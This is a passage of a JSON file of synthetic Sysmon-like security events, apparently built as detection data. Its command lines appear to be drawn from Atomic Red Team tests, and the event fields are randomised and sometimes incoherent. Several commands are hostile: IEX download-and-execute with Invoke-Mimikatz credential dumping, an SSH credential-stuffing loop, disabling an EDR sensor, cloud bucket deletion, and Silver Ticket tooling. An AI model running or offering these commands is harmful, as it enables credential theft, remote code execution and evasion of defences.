\\\"foo\\\" | runas /netonly /user:fake \\\"$env:TEMP\\\\silver.bat\\\" | Out-Null\\n\\n# wait until the output file has logged the entire attack\\ndo {\\n  Start-Sleep 1 # wait a bit so the output file has time to be created\\n  Get-Content -Path \\\"$env:TEMP\\\\silver.txt\\\" -Wait | ForEach-Object {\\n    if ($_ -match 'End of Silver Ticket attack') { break } \\n  }\\n} while ($false) # dummy loop so that 'break' can be used\\n\\n# show output from new empty session\\nGet-Content $env:TEMP\\\\silver.txt\\n\\n# cleanup temp files\\nRemove-Item $env:TEMP\\\\silver.bat -ErrorAction Ignore\\nRemove-Item $env:TEMP\\\\silver.txt -ErrorAction Ignore\\n\",",
        "LogonID": 448364,
        "LogonGuid": "9b4104e5-e1da-4be9-9f47-731cd9d56802",
        "SourceProcessID": 5975,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\firm..dll",
        "DestinationProcessID": 8348,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\help..dll",
        "UtcTime": "2024-05-17T01:36:51.660100Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-89.king.com",
        "User": "gtaylor",
        "ProcessID": 7441,
        "ProcessName": "malware.exe",
        "CommandLine": "\"cd \\\"#{rsp_file_path}\\\"\\nodbcconf.exe -f \\\"#{rsp_file_name}\\\"\\n\",",
        "LogonID": 713679,
        "LogonGuid": "d4ef9a69-b742-4491-96bd-81ae0c39e9fc",
        "SourceProcessID": 5403,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\picture..exe",
        "DestinationProcessID": 2345,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\report..exe",
        "UtcTime": "2024-05-17T01:36:51.661098Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-09.hopkins.org",
        "User": "ojackson",
        "ProcessID": 4571,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"$address = (& \\\"$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\searchVuln.exe\\\" \\\"$PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\vuln_dll\\\\\\\" | Out-String | Select-String -Pattern \\\"VirtualAddress: (\\\\w+)\\\").Matches.Groups[1].Value\\n& \\\"PathToAtomicsFolder\\\\T1055\\\\bin\\\\x64\\\\RWXinjectionLocal.exe\\\" \\\"#{vuln_dll}\\\" $address\\n\",",
        "LogonID": 116279,
        "LogonGuid": "f93bbc8f-efa7-4512-bc63-a0aed8b07e6e",
        "SourceProcessID": 4964,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\show..dll",
        "DestinationProcessID": 1585,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\rest..dll",
        "UtcTime": "2024-05-17T01:36:51.661098Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-77.brown.com",
        "User": "donnacampos",
        "ProcessID": 7666,
        "ProcessName": "nc.exe",
        "CommandLine": "\"echo \\\"\\\" | \\\"#{plink_file}\\\" \\\"#{vm_host}\\\" -ssh  -l \\\"#{vm_user}\\\" -pw \\\"#{vm_pass}\\\" -m \\\"#{cli_script}\\\"\\n\",",
        "LogonID": 717652,
        "LogonGuid": "04d4db86-056b-4912-b7c6-965b6dd58868",
        "SourceProcessID": 4620,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\teach..dll",
        "DestinationProcessID": 8446,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\contain..exe",
        "UtcTime": "2024-05-17T01:36:51.661098Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "desktop-84.alvarado-watts.com",
        "User": "sharon00",
        "ProcessID": 6689,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"go run #{input_file}\\n\",",
        "LogonID": 121049,
        "LogonGuid": "02118e09-6b55-47c0-b018-a4c37dfe8660",
        "SourceProcessID": 8221,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\special..exe",
        "DestinationProcessID": 8208,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\whether..exe",
        "UtcTime": "2024-05-17T01:36:51.661098Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "db-90.boyle-bell.com",
        "User": "thomaschristine",
        "ProcessID": 2770,
        "ProcessName": "nc.exe",
        "CommandLine": "\"Start-BitsTransfer -Priority foreground -Source #{remote_file} -Destination #{local_file}\\n\",",
        "LogonID": 214477,
        "LogonGuid": "39826b33-964d-4b36-bf5d-64f1768e4b4d",
        "SourceProcessID": 7545,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\respond..dll",
        "DestinationProcessID": 9903,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\short..exe",
        "UtcTime": "2024-05-17T01:36:51.661098Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-86.francis.org",
        "User": "ebuchanan",
        "ProcessID": 6644,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"get-acl REGISTRY::HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\* |FL\\nget-acl REGISTRY::HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\#{weak_service_name} |FL\\n\",",
        "LogonID": 969756,
        "LogonGuid": "c4f9b690-244d-4346-9618-eeade52b44b6",
        "SourceProcessID": 2629,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\area..dll",
        "DestinationProcessID": 4549,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\often..exe",
        "UtcTime": "2024-05-17T01:36:51.662100Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-67.terry.com",
        "User": "joshuarobinson",
        "ProcessID": 5148,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"sudo systemctl stop falcon-sensor.service\\nsudo systemctl disable falcon-sensor.service\\n\",",
        "LogonID": 920787,
        "LogonGuid": "e9b9cb81-b34d-4bee-8546-9032095f5fcc",
        "SourceProcessID": 6547,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Windows\\simply..dll",
        "DestinationProcessID": 9285,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\real..exe",
        "UtcTime": "2024-05-17T01:36:51.662100Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-99.garcia-maldonado.com",
        "User": "richardcoleman",
        "ProcessID": 2400,
        "ProcessName": "nc.exe",
        "CommandLine": "\"New-Item -Path #{teamviewer_log_file} -Force | Out-Null\\nRemove-Item #{teamviewer_log_file} -Force -ErrorAction Ignore\\n\",",
        "LogonID": 733246,
        "LogonGuid": "ac5f749b-a62b-4327-b094-16171b669823",
        "SourceProcessID": 4510,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\song..exe",
        "DestinationProcessID": 1769,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\perform..dll",
        "UtcTime": "2024-05-17T01:36:51.662100Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-53.sullivan.net",
        "User": "wreese",
        "ProcessID": 4896,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\AU\\\" /v \\\"AUOptions\\\" /t REG_DWORD /d 2 /f\\n\",",
        "LogonID": 868622,
        "LogonGuid": "a5e01dfb-5fe7-4aaf-ad39-a2b26ade13d6",
        "SourceProcessID": 9182,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\up..dll",
        "DestinationProcessID": 7603,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\difficult..exe",
        "UtcTime": "2024-05-17T01:36:51.662100Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-84.west.com",
        "User": "wellscurtis",
        "ProcessID": 3691,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"query user\\n\",",
        "LogonID": 650785,
        "LogonGuid": "ce6d6086-e10d-44f3-8a66-99657e9b72ab",
        "SourceProcessID": 7432,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\in..dll",
        "DestinationProcessID": 4124,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\trade..dll",
        "UtcTime": "2024-05-17T01:36:51.662100Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-69.baker.com",
        "User": "tiffany87",
        "ProcessID": 6701,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Get-ADComputer #{hostname} -Properties *\",",
        "LogonID": 945311,
        "LogonGuid": "c9dafe14-eeeb-4730-96ef-c417a4987a4e",
        "SourceProcessID": 9654,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\anything..dll",
        "DestinationProcessID": 1771,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\wait..exe",
        "UtcTime": "2024-05-17T01:36:51.663101Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-90.jarvis-rose.com",
        "User": "pagejared",
        "ProcessID": 5457,
        "ProcessName": "nc.exe",
        "CommandLine": "\"reg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters\\\" /v AutoShareServer /t REG_DWORD /d 0 /f\\nreg add \\\"HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\LanmanServer\\\\Parameters\\\" /v AutoShareWks /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 179079,
        "LogonGuid": "b56528ed-28db-40a7-9e47-ec03ad9fc5eb",
        "SourceProcessID": 9210,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Program Files\\investment..exe",
        "DestinationProcessID": 6976,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Program Files\\baby..exe",
        "UtcTime": "2024-05-17T01:36:51.663101Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-95.sutton-ferguson.com",
        "User": "grobinson",
        "ProcessID": 7085,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\SOFTWARE\\\\Policies\\\\Microsoft\\\\Windows\\\\WindowsUpdate\\\\AU\\\" /v \\\"NoAutoRebootWithLoggedOnUsers\\\" /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 214650,
        "LogonGuid": "a12919fd-9e63-4825-bc98-23e4207a9f63",
        "SourceProcessID": 3727,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\respond..dll",
        "DestinationProcessID": 6330,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\break..dll",
        "UtcTime": "2024-05-17T01:36:51.663101Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-70.gutierrez.com",
        "User": "davidvelasquez",
        "ProcessID": 9223,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"tar -cvzf #{output_file} #{input_file_folder}\\n\",",
        "LogonID": 793129,
        "LogonGuid": "5cad1559-c157-4769-b576-0f57d9153713",
        "SourceProcessID": 8787,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\great..exe",
        "DestinationProcessID": 9613,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\only..exe",
        "UtcTime": "2024-05-17T01:36:51.663101Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "laptop-39.williams.info",
        "User": "meganhaley",
        "ProcessID": 6317,
        "ProcessName": "nc.exe",
        "CommandLine": "\"reboot\\n\",",
        "LogonID": 759629,
        "LogonGuid": "fd62ac85-b8a2-44f7-81c5-cdcae255e0c3",
        "SourceProcessID": 8223,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\let..exe",
        "DestinationProcessID": 8766,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\management..exe",
        "UtcTime": "2024-05-17T01:36:51.664101Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-19.peters-flores.com",
        "User": "catherine00",
        "ProcessID": 8817,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"gpresult /z\\n\",",
        "LogonID": 769964,
        "LogonGuid": "72d4ca49-e926-48f2-8936-ead5eee5c29e",
        "SourceProcessID": 1785,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\money..dll",
        "DestinationProcessID": 7995,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Program Files\\car..dll",
        "UtcTime": "2024-05-17T01:36:51.664101Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-76.medina.biz",
        "User": "jbowman",
        "ProcessID": 3688,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\\n\",",
        "LogonID": 168329,
        "LogonGuid": "9f249417-f7a3-4715-82d8-1f620d625915",
        "SourceProcessID": 1984,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\build..dll",
        "DestinationProcessID": 6764,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\focus..exe",
        "UtcTime": "2024-05-17T01:36:51.664101Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-69.butler.com",
        "User": "kelleyjames",
        "ProcessID": 9325,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystem.ps1')\",",
        "LogonID": 760022,
        "LogonGuid": "e307bd2f-7d7d-4924-9e16-03ef62394f54",
        "SourceProcessID": 2536,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\employee..dll",
        "DestinationProcessID": 2812,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Users\\Public\\animal..exe",
        "UtcTime": "2024-05-17T01:36:51.664101Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "desktop-17.miller.com",
        "User": "christopher08",
        "ProcessID": 8134,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"sudo defaults read /Library/Preferences/com.apple.alf\\nsudo /usr/libexec/ApplicationFirewall/socketfilterfw --getglobalstate\\n\",",
        "LogonID": 721888,
        "LogonGuid": "b47693ac-20a8-4e94-a2c9-de2a408d2f3f",
        "SourceProcessID": 6090,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\growth..exe",
        "DestinationProcessID": 3566,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\during..dll",
        "UtcTime": "2024-05-17T01:36:51.664101Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-18.young.com",
        "User": "hmedina",
        "ProcessID": 4637,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"del /f #{file_to_delete}\\n\",",
        "LogonID": 260032,
        "LogonGuid": "d710ec16-4372-432e-8535-ae50530f46fe",
        "SourceProcessID": 6114,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\improve..exe",
        "DestinationProcessID": 3052,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\forget..dll",
        "UtcTime": "2024-05-17T01:36:51.665102Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-17.mckinney-gray.info",
        "User": "bookersharon",
        "ProcessID": 9401,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"#{soaphound_path} --user #{user} --password #{password} --domain #{domain} --dc #{dc} --bhdump --cachefilename #{cachefilename} --outputdirectory #{outputdirectory}\\n\",",
        "LogonID": 459876,
        "LogonGuid": "b2256a1f-daa4-4a5f-9227-568bd549aa8b",
        "SourceProcessID": 3605,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\list..exe",
        "DestinationProcessID": 4798,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\hit..exe",
        "UtcTime": "2024-05-17T01:36:51.665102Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "web-27.smith.com",
        "User": "garciakarl",
        "ProcessID": 8158,
        "ProcessName": "nc.exe",
        "CommandLine": "\"cp \\\"$PathToAtomicsFolder/T1110.004/src/credstuffuserpass.txt\\\" /tmp/\\nfor unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d\\\":\\\" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d\\\":\\\" -f1`@#{target_host};done\\n\",",
        "LogonID": 780574,
        "LogonGuid": "213d4fdd-2c84-4473-b2f3-f5e97666e001",
        "SourceProcessID": 7202,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\offer..dll",
        "DestinationProcessID": 4745,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\side..dll",
        "UtcTime": "2024-05-17T01:36:51.665102Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-96.pace-moore.com",
        "User": "sfranco",
        "ProcessID": 5642,
        "ProcessName": "nc.exe",
        "CommandLine": "\"gcloud config set project #{project_id}\\ngcloud storage buckets delete gs://#{bucket_name}\\n\",",
        "LogonID": 951070,
        "LogonGuid": "3ac3fecb-641e-4485-add6-51a9c6c91c68",
        "SourceProcessID": 2959,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\mouth..exe",
        "DestinationProcessID": 4302,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\and..dll",
        "UtcTime": "2024-05-17T01:36:51.665612Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-13.rodgers.net",
        "User": "kevinhernandez",
        "ProcessID": 2520,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal Services\\\" /v \\\"DisableSecuritySettings\\\" /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 269500,
        "LogonGuid": "6e405656-6f1c-420a-b492-eab1d9d4c1b3",
        "SourceProcessID": 8032,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\couple..dll",
        "DestinationProcessID": 9074,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\very..dll",
        "UtcTime": "2024-05-17T01:36:51.665612Z"
    },
